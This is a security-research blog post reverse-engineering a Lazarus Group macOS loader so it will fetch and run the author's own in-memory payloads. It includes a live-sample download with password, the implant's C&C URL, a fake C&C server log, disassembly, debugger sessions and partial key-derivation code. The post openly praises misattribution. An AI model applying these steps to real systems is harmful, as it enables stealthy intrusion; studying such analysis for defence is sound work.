<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  <head>
    <meta charset="UTF-8">
    
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    <link href="../css/style.css" rel="stylesheet" />
    <script src="../js/analytics.js"></script>
    <script src="../js/sweetalert.min.js"></script>
    <script src="../js/donationPopup.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
    
    
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x54/twitter.png />
<meta name="twitter:title" content=Weaponizing&#32;a&#32;Lazarus&#32;Group&#32;Implant />
<meta name="twitter:description" content=repurposing&#32;a&#32;1st-stage&#32;loader,&#32;to&#32;execute&#32;custom&#32;&#39;fileless&#39;&#32;payloads />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=Weaponizing&#32;a&#32;Lazarus&#32;Group&#32;Implant />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x54/twitter.png />

    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/products.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    <div class="pageContent">
      <br>
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">Weaponizing a Lazarus Group Implant</div>
  <div class="blogSubTitle">repurposing a 1st-stage loader, to execute custom &#39;fileless&#39; payloads</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / February 22, 2020</div>
  <br>
<div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; margin-bottom: 15px; font-size: 15px;">
    <span class="n3rdFont">
    Our research, tools, and writing, are supported by the "Friends of Objective-See" such as:
    <br>
    <center>
      <a href="https://macpaw.com/cleanmymac" style="text-decoration: none;">
      <img src="../images/friends/cleanmymac.png" width="100px;" style="display:block;  margin:auto; padding-top: 10px;"/>
      CleanMy Mac X
      </a>
    </center>
    <table border="0" style="width:100%; border: none">
    <tr style="width:100%;">
    <td style="padding: 0px; border: none" border="0" align="center">
      <a href="https://malwarebytes.com/?objective-see" style="text-decoration: none;">
      <img src="../images/friends/malwarebytes.png" width="100px;" style="display:block;  margin:auto; padding-top: 0px;"/>
      Malwarebytes
      </a>
    </td>
    <td style="padding: 0px; border: none" border="0" align="center">
      <a href="https://www.airoav.com/" style="text-decoration: none;">
      <img src="../images/friends/airo.png" width="100px;" style="display:block;  margin:auto; padding-top: 0px;"/>
      Airo AV
      </a>
    </td>
    </tr>
    </table>
    <br>
    <div align="right" style="padding-right:10px; padding-bottom:10px;">
        <a href="https://objective-see.com/friends.html" class="inlineLink">Become a Friend!</a>
    </div>
  </span>
</div>
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>I&rsquo;ve added the <a href="https://objective-see.com/downloads/malware/AppleJeus.zip">sample</a> (&lsquo;OSX.AppleJeus.C&rsquo;) to our malware collection (password: infect3d)</p>
<p>&hellip;please don’t infect yourself!</p>
</div>
<h3 id="background">Background</h3>
<p>Recently a new piece of macOS malware was discovered:</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Another <a href="https://twitter.com/hashtag/Lazarus?src=hash&amp;ref_src=twsrc%5Etfw">#Lazarus</a> <a href="https://twitter.com/hashtag/macOS?src=hash&amp;ref_src=twsrc%5Etfw">#macOS</a> <a href="https://twitter.com/hashtag/trojan?src=hash&amp;ref_src=twsrc%5Etfw">#trojan</a> <br>md5: 6588d262529dc372c400bef8478c2eec<br>hxxps://unioncrypto.vip/<br><br>Contains code: Loads Mach-O from memory and execute it /  Writes to a file and execute it<a href="https://twitter.com/patrickwardle?ref_src=twsrc%5Etfw">@patrickwardle</a> <a href="https://twitter.com/thomasareed?ref_src=twsrc%5Etfw">@thomasareed</a> <a href="https://t.co/Mpru8FHELi">pic.twitter.com/Mpru8FHELi</a></p>&mdash; Dinesh_Devadoss (@dineshdina04) <a href="https://twitter.com/dineshdina04/status/1201834142704394242?ref_src=twsrc%5Etfw">December 3, 2019</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>In a previous <a href="blog_0x51.html">blog post</a> I analyzed this intriguing specimen (internally named <code>macloader</code>), created by the (in)famous Lazarus group.</p>
<p>This post highlighed its:</p>
<ul>
<li>
<p>Persistence:
<br>
<code>/Library/LaunchDaemons/vip.unioncrypto.plist</code> -&gt; <code>/Library/UnionCrypto/unioncryptoupdater</code></p>
</li>
<li>
<p>Command and Control (C&amp;C) Server:
<br>
<code>https://unioncrypto.vip/update</code></p>
</li>
<li>
<p>Capabilities:
<br>
The in-memory execution of a remotely downloaded payloads.</p>
</li>
</ul>
<div class="note">
<p>For a full technical analysis of the sample, read my writeup: &ldquo;<a href="blog_0x51.html">Lazarus Group Goes &lsquo;Fileless&rsquo;</a>&rdquo;</p>
</div>
<p>While many aspects of the malware, such as its (launch daemon) persistence mechanism are quite prosaic, its ability to directly execute downloaded (&ldquo;2<sup>nd</sup>-stage&rdquo;) payloads directly from memory is rather unique. Besides increasing stealth and complicating forensics analysis of said payloads (as they never touch the file-system), it&rsquo;s just plain sexy!</p>
<p>It also makes for the perfect candidate for &ldquo;repurposing&rdquo;, which is what we&rsquo;ll walk-thru today.</p>
<h3 id="repurposing-malware">Repurposing Malware</h3>
<p>At DefCon #27, I gave a talk titled, &ldquo;<a href="https://speakerdeck.com/patrickwardle/harnessing-weapons-of-mac-destruction">Harnessing Weapons of Mac Destruction</a>&rdquo;, which detailed the process of repurposing (or &ldquo;recycling&rdquo;) other peoples&rsquo; Mac malware:</p>
<center>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="https://www.youtube.com/embed/InL3YA_6P6s" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
</div>
  
</center>
<p>In a nutshell, the idea is take existing malware and reconfigure (&ldquo;repurpose&rdquo; or &ldquo;recycle&rdquo;) it for your own surreptitious purposes (i.e. testing, red-teaming, offensive cyber-operations, etc):</p>
<img src="../images/blog/blog_0x54/repurpose.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>The talk also covered the many benefits of repurposing others&rsquo; malware; benefits that basically boil down to the fact that various well-funded groups and agencies are creating fully-featured malware, so why not leverage their hard work &hellip;in a way (that if discovered) will likely be (mis)attribute back to them?</p>
<img src="../images/blog/blog_0x54/reasons.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>&hellip;IMHO, it&rsquo;s a lovely idea 😇</p>
<div class="note">
<p>To view the full slides from my talk, checkout: <a href="https://speakerdeck.com/patrickwardle/harnessing-weapons-of-mac-destruction">&ldquo;Harnessing Weapons of Mac Destruction&rdquo;</a></p>
</div>
<p>The Lazarus group&rsquo;s malware we&rsquo;re looking at today is a perfect candidate for repurposing. Why? As a 1<sup>st</sup>-stage loader, it simply beacons out to a remote server for 2<sup>nd</sup>-stage payloads (which as noted, are executed directly from memory). Thus once we understand its protocol and the expected format of the payloads, (in theory) it should be rather trivial to repurpose the loader to communicate instead with <strong>our</strong> server, and thus stealthily execute <strong>our</strong> own 2<sup>nd</sup>-stage payloads!</p>
<p>This gives us &lsquo;access&rsquo; then, to an advanced 1<sup>st</sup>-stage loader that will execute our custom payloads (from memory!) &hellip;without us having to write a single-line of (client-side) code. 😎</p>
<p>Better yet, as the repurposing-modifications will be minimal, if this repurposed sample is ever detected, it surely well be (mis)attributed back to the original authors (and as our 2<sup>nd</sup>-stage payloads never hit the file-system, will more than likely remain undetected) 😎😎 #winning</p>
<h3 id="repurposing-lazaruss-loader">Repurposing Lazarus&rsquo;s Loader</h3>
<p>After identifying a malware specimen to repurpose (&ldquo;recycle&rdquo;), the next step is to comprehensively understand how it works:</p>
<img src="../images/blog/blog_0x54/analysis.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>The goal of this analysis phase is to:</p>
<ul>
<li>Identify the method of persistence</li>
<li>Understand the capabilities / payload</li>
<li>Identify the command &amp; control server</li>
<li>Understand the communications protocol</li>
</ul>
<p>In a previous blog post, &ldquo;<a href="blog_0x51.html">Lazarus Group Goes &lsquo;Fileless&rsquo;</a>&rdquo; we thoroughly analyzed the sample and answered the majority of these questions.</p>
<p>However, I did not discuss the malware&rsquo;s communications protocol, specifically the format of the response from the remote server &hellip;the response that contains the 2<sup>nd</sup>-stage payload(s). As our ultimate goal is to repurpose this malware such that it executes our own 2<sup>nd</sup>-stage payloads, this protocol and payload format is essential to understand!</p>
<div class="note">
<p>To facilitate dynamic analysis and to understand the malware protocol, I created a simple python HTTPS server that would respond to the malware&rsquo;s requests.</p>
<p>Although (initially) I did not know the expected format of the data, trial and error (plus a healthy dose of reverse-engineering) proved sufficient!</p>
</div>
&nbsp;
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# python server.py

  [+] awaiting connections
  [+] new connection from 192.168.0.2:

  ======= POST HEADERS =======
  Host: unioncrypto.vip
  Accept: */*
  auth_signature: ca57054ea39f84a6f5ba0c65539a0762
  auth_timestamp: 1581048662
  Content-Length: 62
  Content-Type: application/x-www-form-urlencoded

  ======= POST BODY =======
  MiniFieldStorage('act', 'check')
  MiniFieldStorage('ei', 'Mac OS X 10.15 (19A603)')
  MiniFieldStorage('rlz', 'VMI5EOhq8gDz')
  MiniFieldStorage('ver', '1.0')
  [06/Feb/2020 20:11:08] "POST /update HTTP/1.1" 200 -

</pre>
</div>
<p>Armed with a simple (initially bare-boned) custom C&amp;C server to respond to the malware&rsquo;s requests, we can begin to understand the network protocol, with the ultimate goal of understanding how the 2<sup>nd</sup>-stage payloads should be remotely delivered to the malicious loader, on infected systems.</p>
<p>First, we note that on check in the malware provides some (basic) information after the infected system (e.g. the macOS version/build number: <code>Mac OS X 10.15 (19A603)</code>, serial number: <code>VMI5EOhq8gDz</code>, etc.), and implant version (<code>'ver', '1.0'</code>).</p>
<p>Moving on we can hop into a disassembler to look at the malware&rsquo;s code responsible for connecting to the C&amp;C server, and parsing/processing the server&rsquo;s response.</p>
<p>In the malware&rsquo;s disassembly we find a function named <code>onRun()</code> that invokes a method named <code>Barbeque::post</code>. This method connects to the remote server (<code>https://unioncrypto.vip/</code>) and expects the server to respond with an <code>HTTP 200 OK</code>. Otherwise it takes a nap (before trying again):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">onRun</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    <span style="color:#75715e">//connect to server
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span><span style="color:#75715e"></span>    Barbeque<span style="color:#f92672">::</span>post(...);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>    <span style="color:#66d9ef">if</span>(response <span style="color:#f92672">!=</span> <span style="color:#ae81ff">200</span>) <span style="color:#66d9ef">goto</span> sleep;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9</span><span>}</span></span></code></pre></div>
<p>Assuming the (our) server responds with an <code>HTTP 200 OK</code>, the malware checks that at least <code>0x400</code> bytes were received, before base64-decoding said bytes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">onRun</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    <span style="color:#75715e">//rdx: # of bytes
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#75715e"></span>    <span style="color:#75715e">// make sure at least 0x400 bytes were recv&#39;d
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ((rdx <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0x400</span>) <span style="color:#f92672">&amp;&amp;</span> ...))) 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>      <span style="color:#75715e">//rbx: recv&#39;d bytes
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span><span style="color:#75715e"></span>      <span style="color:#75715e">// base64 decond recv&#39;d bytes
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span><span style="color:#75715e"></span>      rax <span style="color:#f92672">=</span> base64_decode(rbx, <span style="color:#f92672">&amp;</span>var_80);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>      ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>}</span></span></code></pre></div>
<p>&hellip;so already, we know the server&rsquo;s response (which the malware expects to be a 2<sup>nd</sup>-stage payload) must be at least <code>0x400</code> in length &hellip;and base64 encoded. As such, we update our custom C&amp;C server to respond with at least <code>0x400</code> bytes of base64 encoded data (that for now, just decodes to <code>ABCDEFGHIJKLMNOPQRSTUVWXYZABCD...</code>).</p>
<p>Once we respond with the correct number (<code>0x400</code>+) of base64 encoded bytes, the malware happily continunes and invokes a function named <code>processUpdate</code> (at address <code>0x0000000100004be3</code>). In a debugger, we can see this function takes the (base64 decoded) bytes (in <code>RDI</code>) and their length (in <code>RSI</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ lldb unioncryptoupdater

...

(lldb) b 0x0000000100004be3
Breakpoint 1: where = unioncryptoupdater`processUpdate(unsigned char*, unsigned long), address = 0x0000000100004be3

(lldb) r

...

(lldb) Process 2813 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000100004be3 unioncryptoupdater`processUpdate(unsigned char*, unsigned long)

(lldb) (lldb) x/s $rdi
0x100800600: "ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ...

(lldb) reg read $rsi
rsi = 0x000000000000401

</pre>
</div>
<p>As shown in the debugger output, so far, the malware is content with our server&rsquo;s response, as the response is over <code>0x400</code> bytes in length and encoded correctly. (Note our decoded bytes, <code>ABC...</code> in the <code>rdi</code> register).</p>
<p>In the previous <a href="blog_0x51.html">blog post</a>, we noted that the <code>processUpdate</code> function calls into a method named <code>load_from_memory</code> to, well, load (and execute) the received bytes &hellip;the 2<sup>nd</sup>-stage payload(s). However, before it invokes this function it calls two other functions:</p>
<ul>
<li><code>md5_hash_string</code></li>
<li><code>aes_decrypt_cbc</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">processUpdate</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span> arg0, <span style="color:#66d9ef">long</span> arg1) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    rax <span style="color:#f92672">=</span> md5_hash_string(<span style="color:#f92672">&amp;</span>var_4D8);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    r15 <span style="color:#f92672">=</span> rbx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    rdx <span style="color:#f92672">=</span> r14 <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    <span style="color:#66d9ef">if</span> ((var_4D8 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x1</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>        rcx <span style="color:#f92672">=</span> var_4C8;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>         rcx <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>var_4D7;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    _aes_decrypt_cbc(<span style="color:#ae81ff">0x0</span>, r15, rdx, rcx, <span style="color:#f92672">&amp;</span>var_40);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>}</span></span></code></pre></div>
<p>Let&rsquo;s step thru this in a debugger to see what it&rsquo;s hashing, and what/how it&rsquo;s (<code>AES</code>) decrypting.</p>
<p>Using our simple python HTTPS (C&amp;C) server we&rsquo;ll serve up again <code>0x400</code>+ bytes of <code>ABCDEFGHIJKLMNOPQRSTUVWXYZABC...</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ lldb unioncryptoupdater

(lldb) x/i $pc 
0x100004c58 <+117>: callq  0x100004dab  ; md5_hash_string(...);

//print out bytes passed to md5_hash_string()
// recall that $rsi will contain the first arg
(lldb) x/24bx $rsi
0x100008388: 0x18 0x56 0x4d 0x49 0x35 0x45 0x4f 0x68
0x100008390: 0x71 0x38 0x67 0x44 0x7a 0x00 0x00 0x00
0x100008398: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00

//print out as a string
(lldb) x/s $rsi+1
0x100008389: "VMI5EOhq8gDz"

</pre>
</div>
<p>Stopping at the call to the <code>md5_hash_string</code> function, we can dump the string being passed in. Turns out it&rsquo;s: <code>VMI5EOhq8gDz</code> (albeit prefixed with <code>0x18</code>).</p>
<div class="note">
<p>The calling convention utilized by macOS is the &ldquo;System V&rdquo; 64-bit ABI &hellip;which always passes the first argument in the <code>rsi</code> register.</p>
<p>&ldquo;System V operating systems [and macOS] will use RDI, RSI, RDX, RCX, R8 and R9. XMM0, XMM1, XMM2, XMM3, XMM4, XMM5, XMM6 and XMM7 will be used to pass floating point parameters. RAX will hold the syscall number. Additional arguments are passed via the stack (right to left).</p>
<p>Return values are sent back via RAX.&rdquo;</p>
<p>-<a href="https://tuttlem.github.io/2013/02/14/64bit-abi-cheatsheet.html">64bit ABI Cheatsheet</a></p>
</div>
<p>Once the malware has generated an <code>MD5</code> hash of this string, it invokes the <code>aes_decrypt_cbc</code> function. What does it pass in?</p>
<p>In the disassembler, the <code>aes_decrypt_cbc</code> function is invoked in the following manner: <code>_aes_decrypt_cbc(0x0, r15, rdx, rcx, &amp;var_40);</code>
Hopping back into the debugger we can determine what the <code>r15</code>, <code>rdx</code>, and <code>rcx</code> registers hold:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ lldb unioncryptoupdater

(lldb) x/i $pc 
0x100004c85 <+162>: callq  0x100004095  ; aes_decrypt_cbc

(lldb) x/s $r15
0x100800610: "QRSTUVWXYZABCDEF...

(lldb) reg read $rdx
rdx = 0x00000000000003F1

(lldb) x/16xb $rcx
0x7ffeefbff279: 0x26 0x1d 0xfd 0xb9 0x70 0x43 0x84 0xf4
0x7ffeefbff281: 0xf7 0x37 0xe0 0x1c 0x55 0x7a 0xee 0x74

</pre>
</div>
<ul>
<li>
<p><code>r15</code>: appears to be a pointer into the received (now base64 decoded) bytes.
Looking back a few instructions in the disassembly we see: <code>r15 = rbx + 0x10</code> (<code>rbx</code> is a pointer to the start of the received decoded bytes).
<br>
<br>
Thus, <code>r15</code> points exactly <code>0x10</code> (<code>16d</code>) bytes into the received, decoded bytes.</p>
</li>
<li>
<p><code>rdx</code>: appears to be <code>0x10</code> less than the size of the total (received) decoded bytes.
Again, a few instructions back, we see: <code>rdx = r14 - 0x10</code> (<code>r14</code> holds the total sized of the received decoded bytes).
<br>
<br>
In other words, <code>rdx</code> is the remaining size of the (received) decoded bytes (from <code>r15</code> to the end!).</p>
</li>
<li>
<p><code>rcx</code>: appears initially to be a pointer some random/unknown bytes (<code>0x26 0x1d 0xfd 0xb9 ...</code>).
However, by looking back in the disassembly, we can see it&rsquo;s the result of hashing the <code>VMI5EOhq8gDz</code> string!
<br>
<br>
We can also confirm this, by manually (<code>MD5</code>) hashing <code>VMI5EOhq8gDz</code>, which results in <code>0x26 0x1d 0xfd 0xb9 ...</code> (matching <code>rcx</code>):
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;VMI5EOhq8gDz&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>key <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(password)<span style="color:#f92672">.</span>digest()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>print(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">key: &#39;</span>),
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(key)):
